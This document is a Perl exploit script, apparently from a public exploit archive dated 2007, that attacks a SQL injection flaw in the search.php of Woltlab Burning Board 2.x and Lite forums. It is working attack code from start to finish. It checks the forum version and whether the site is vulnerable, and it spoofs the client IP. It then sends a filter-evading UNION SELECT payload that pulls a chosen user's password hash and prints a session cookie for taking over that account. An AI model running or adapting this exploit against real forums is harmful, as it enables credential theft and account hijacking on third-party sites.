#!/usr/bin/perl
#       Woltlab Burning Board 2.X/Lite search.php SQL Injection exploit - burned.pl
#       written by trew <trew@safe-mail.net>
#
#       should work on every wbb regardless of php settings.
#
#       v 1.2 - added 1337 sql filter evasion, version identification,better regex,raw cookie
# v 1.1 - added wbblite support (thx to lama)
#
#
#
# !PRIVATE! - !PRIVATE!
#
# Leaked by some morons from egocrew
#


use strict;      # 1337
use warnings;    # 31337
use LWP::UserAgent;
use HTTP::Response;
use HTTP::Status;
use Getopt::Std;
getopt('uisUpAclC');
our ( $opt_u, $opt_i, $opt_s, $opt_U, $opt_p, $opt_A, $opt_c, $opt_l, $opt_C );
my $target = shift;
sub do_request($$);
if ( !$target ) { &HELP_MESSAGE; }
my ( $host, $folder );

if ( $target =~ /(?:http:\/\/)?([\w\.\-\_]*)(\/.*)?/ ) {

   $host = $1;
   $folder = ( $2 ? $2 : '/' );
   if ( $folder !~ /\/$/ ) { $folder .= '/'; }
   $target = "http://$host$folder" . 'search.php';
}
else { &HELP_MESSAGE; }

my $ip           = ( $opt_i ? $opt_i : '127.0.0.1' );
my $searchstring = ( $opt_s ? $opt_s : 'board' );
my ( $userid, $userpassword, $proxy, $proxyip );
( $userid, $userpassword ) = split( ':', $opt_U ) if $opt_U;
( $proxy,  $proxyip )      = split( ':', $opt_p ) if $opt_p;
my $uid = ( $opt_u ? $opt_u : 1 );
my $useragent =
 ( $opt_A ? $opt_A : 'Mozilla/5.0 Gecko/20061206 Firefox/1.5.0.9' );
my $prefix = ( $opt_c ? $opt_c : 'wbb2_' );
my $lite   = ( $opt_l ? $opt_l : 0 );
my $isHash = 0;

print "burned.pl written by trew\n";
print "report errors \@ trew\@safe-mail.net.. thx\n";
print "[x] Attacking $target...\n";

if ( $userpassword and $userpassword =~ /([a-f0-9]{32})/ ) { $isHash = 1; }

if ( !$lite ) {
   print "[x] Checking wbb version...\n";
   if ( do_request( '', 'editor.jar' ) =~ /404 Not Found/ ) {

       print "[x] Looks like a wbblite\n";
       $prefix = "" if ( !$opt_c );
       $lite = 1;
   }
   else { print "[x] Looks like a normal wbb\n"; }
}

if ( !$lite ) {
   if ( !$opt_c ) {

       my $headers = do_request( '', '' );
       if ( $headers =~ /Set-Cookie: (.*?)cookiehash/ ) {
           $prefix = $1;
       }
       else { print $headers}

   }
   print "[x] Cookie prefix: $prefix\n";
}
print "[x] Vulnerable check:";

my $answer;
my $pre;
$answer = do_request( '\'', '' );

if ( $answer =~ /FROM (.*?)_boards/ ) {
   $pre = $1;
   print " Vulnerable\n";
}
elsif ($answer =~ /Die Suche ergab keine/
   or $answer =~ /No results were found for this search/
   or $answer =~ /Your search is invalid/
   or $answer =~ /Ihre Suchabfrage ist/ )
{
   print " No Idea\n";
   print "[x] Searchstring was not found, try a different one with -s\n";
   exit;
}
elsif ($answer =~ /Ihnen wird der Zutritt zu dieser Seite/
   or $answer =~ /Access denied/ )
{
   print " No Idea\n";
   print "[x] search.php only for users,";
   print " wrong userdetails or wrong cookie-prefix!\n" if $opt_U;
   print " give me userid+password with -U\n"           if !$opt_U;

   exit;
}
else {
   print " Not Vulnerable!\n";

   #print $answer;
   exit;
}

print "[x] Unleashing black magic...\n";
$answer = do_request(
   ' UNION/*s12s*/  SELECT/*t35s*/  password , password /*er35*/ FRoM ' . $pre
     . '_users  WHeRE/*esr35*/  userid='
     . $uid . '/*',
   ''
);

if ( $answer =~ /${folder}search.php/ and $answer =~ /([a-f0-9]{32})/ ) {
   print "[x] Looks good!\n";
   print "[x] Userid: $uid\n";
   print "[x] Hash: $1\n";
   if ( !$opt_C ) {
       print
"[x] Use this Cookie:\n ${prefix}userid=$uid;${prefix}userpassword=$1\n";
   }

}
else {
   print "[x] Looks bad!\n";
   print $answer;

}

sub HELP_MESSAGE() {
   print "burned.pl written by trew\n"
     . "perl $0 [options] url\n"
     . "examples:\n"
     . "perl $0 woltlab.de/forum/\n"
     . "perl $0 -u 2 -i 127.0.0.2 woltlab.de/de/forum/\n"
     . "overwrite -c and -l only when the auto-check "
     . "gives you a false result\n"
     . "use -C when you need some special cookies\n"
     . "options :\n-u userid of victim [1]\n"
     . "-i faked client-ip [127.0.0.1]\n"
     . "-s searchstring [board]\n"
     . "-U userid:password or userid:pwhash [none]\n"
     . "-p proxyip:proxyport [none]\n"
     . "-A user-agent [firefox 1.5.09]\n"
     . "-c cookie-prefix [auto-check]\n"
     . "-l wbblite mode [auto-check]\n"
     . "-C raw cookie\n";
   exit;
}

sub do_request($$) {
   my $string   = shift;
   my $otherurl = shift;
   if ($otherurl) { $target = "http://$host$folder" . $otherurl; }
   else { $target = "http://$host$folder" . 'search.php' }
   $string = '/*' if ( !$string );
   my $ua = LWP::UserAgent->new;
   if ($proxy) { $ua->proxy( 'http', "http://$proxy:$proxyip/" ); }
   my $request = new HTTP::Request( 'POST', $target );
   $request->content( 'boardids%5B0%5D=1&boardids%5B1%5D=2,3,4)' . $string
         . '&send=1&searchstring='
         . $searchstring );
   $request->content_type('application/x-www-form-urlencoded');
   $request->header( 'User-Agent' => $useragent );

   if ($opt_U) {
       my $userhash;
       if ( !$isHash ) { $userhash = md5($userpassword); }
       else { $userhash = $userpassword; }
       my $cookie = $prefix
         . 'userid='
         . $userid . ';'
         . $prefix
         . 'userpassword='
         . $userhash;

       $request->header( 'Cookie' => $cookie );
   }
   elsif ($opt_C) {
       $request->header( 'Cookie' => $opt_C );
   }
   $request->header( 'Client-Ip' => $ip );
   my $response = $ua->request($request);
   my $body     = $response->content;
   my $headers  = $response->headers_as_string;
   $body = $response->error_as_HTML if ( $response->is_error );

   return $headers if ( $string eq '/*' and !$response->is_error );
   return $body;
}

# MD5 Code ripped from Libwhisker for bigger portability
# thx rfp :)
{
   my ( @S, @T, @M );
   my $code = '';

   sub md5 {
       return undef if ( !defined $_[0] );    # oops, forgot the data
       my $DATA = _md5_pad( $_[0] );
       &_md5_init() if ( !defined $M[0] );
       return _md5_perl_generated( \$DATA );
   }

   sub _md5_init {
       return if ( defined $S[0] );
       my $i;
       for ( $i = 1 ; $i <= 64 ; $i++ ) {
           $T[ $i - 1 ] = int( ( 2**32 ) * abs( sin($i) ) );
       }
       my @t = ( 7, 12, 17, 22, 5, 9, 14, 20, 4, 11, 16, 23, 6, 10, 15, 21 );
       for ( $i = 0 ; $i < 64 ; $i++ ) {
           $S[$i] = $t[ ( int( $i / 16 ) * 4 ) + ( $i % 4 ) ];
       }
       @M = (
           0, 1, 2,  3,  4,  5,  6,  7,  8,  9,  10, 11, 12, 13, 14, 15,
           1, 6, 11, 0,  5,  10, 15, 4,  9,  14, 3,  8,  13, 2,  7,  12,
           5, 8, 11, 14, 1,  4,  7,  10, 13, 0,  3,  6,  9,  12, 15, 2,
           0, 7, 14, 5,  12, 3,  10, 1,  8,  15, 6,  13, 4,  11, 2,  9
       );
       &_md5_generate();
       my $TEST = _md5_pad('foobar');

       if ( _md5_perl_generated( \$TEST ) ne
           '3858f62230ac3c915f300c664312c63f' )
       {
           die('Error: MD5 self-test not successful.');
       }
   }

   sub _md5_pad {
       my $l = length( my $msg = shift() . chr(128) );
       $msg .= "\0" x ( ( $l % 64 <= 56 ? 56 : 120 ) - $l % 64 );
       $l = ( $l - 1 ) * 8;
       $msg .= pack 'VV', $l & 0xffffffff, ( $l >> 16 >> 16 );
       return $msg;
   }

   sub _md5_generate {
       my $N = 'abcddabccdabbcda';
       my ( $i, $M ) = ( 0, '' );
       $M    = '&0xffffffff' if ( ( 1 << 16 ) << 16 ); # mask for 64bit systems
       $code = <<EOT;
       sub _md5_perl_generated {
       BEGIN { \$^H |= 1; }; # use integer
       my (\$A,\$B,\$C,\$D)=(0x67452301,0xefcdab89,0x98badcfe,0x10325476);
       my (\$a,\$b,\$c,\$d,\$t,\$i);
       my \$dr=shift;
       my \$l=length(\$\$dr);
       for my \$L (0 .. ((\$l/64)-1) ) {
               my \@D = unpack('V16', substr(\$\$dr, \$L*64,64));
               (\$a,\$b,\$c,\$d)=(\$A,\$B,\$C,\$D);
EOT
       for ( $i = 0 ; $i < 16 ; $i++ ) {
           my ( $a, $b, $c, $d ) =
             split( '', substr( $N, ( $i % 4 ) * 4, 4 ) );
           $code .=
             "\$t=((\$$d^(\$$b\&(\$$c^\$$d)))+\$$a+\$D[$M[$i]]+$T[$i])$M;\n";
           $code .=
"\$$a=(((\$t<<$S[$i])|((\$t>>(32-$S[$i]))&((1<<$S[$i])-1)))+\$$b)$M;\n";
       }
       for ( ; $i < 32 ; $i++ ) {
           my ( $a, $b, $c, $d ) =
             split( '', substr( $N, ( $i % 4 ) * 4, 4 ) );
           $code .=
             "\$t=((\$$c^(\$$d\&(\$$b^\$$c)))+\$$a+\$D[$M[$i]]+$T[$i])$M;\n";
           $code .=
"\$$a=(((\$t<<$S[$i])|((\$t>>(32-$S[$i]))&((1<<$S[$i])-1)))+\$$b)$M;\n";
       }
       for ( ; $i < 48 ; $i++ ) {
           my ( $a, $b, $c, $d ) =
             split( '', substr( $N, ( $i % 4 ) * 4, 4 ) );
           $code .= "\$t=((\$$b^\$$c^\$$d)+\$$a+\$D[$M[$i]]+$T[$i])$M;\n";
           $code .=
"\$$a=(((\$t<<$S[$i])|((\$t>>(32-$S[$i]))&((1<<$S[$i])-1)))+\$$b)$M;\n";
       }
       for ( ; $i < 64 ; $i++ ) {
           my ( $a, $b, $c, $d ) =
             split( '', substr( $N, ( $i % 4 ) * 4, 4 ) );
           $code .= "\$t=((\$$c^(\$$b|(~\$$d)))+\$$a+\$D[$M[$i]]+$T[$i])$M;\n";
           $code .=
"\$$a=(((\$t<<$S[$i])|((\$t>>(32-$S[$i]))&((1<<$S[$i])-1)))+\$$b)$M;\n";
       }
       $code .= <<EOT;
               \$A=\$A+\$a\&0xffffffff; \$B=\$B+\$b\&0xffffffff;
               \$C=\$C+\$c\&0xffffffff; \$D=\$D+\$d\&0xffffffff;
       } # for
       return unpack('H*', pack('V4',\$A,\$B,\$C,\$D)); }
EOT
       eval "$code";
   }
}    # md5 package container

# milw0rm.com [2007-01-17]
